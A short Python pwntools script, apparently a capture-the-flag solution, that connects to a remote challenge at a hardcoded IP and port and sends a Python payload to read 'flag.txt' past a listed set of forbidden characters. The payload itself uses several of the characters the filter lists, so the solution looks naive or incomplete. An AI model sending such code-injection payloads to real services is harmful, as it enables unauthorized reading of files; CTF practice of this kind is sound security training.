from pwn import *


def send_input(p, input_str):
    p.sendline(input_str)
    return p.recvall()


def main():
    # Set up the connection to the remote challenge
    p = remote("83.136.254.223", 47180)

    # Define the forbidden characters
    forbidden_chars = ';"/\\`-![]*eval%&><+1234567890bsloweruppersystem}{'

    # Craft your input to read the flag.txt file
    payload = f"print(open('flag.txt').read())"

    # Send the payload to the challenge
    result = send_input(p, payload)

    # Print the result
    print(result.decode())

    # Close the connection
    p.close()


if __name__ == "__main__":
    main()
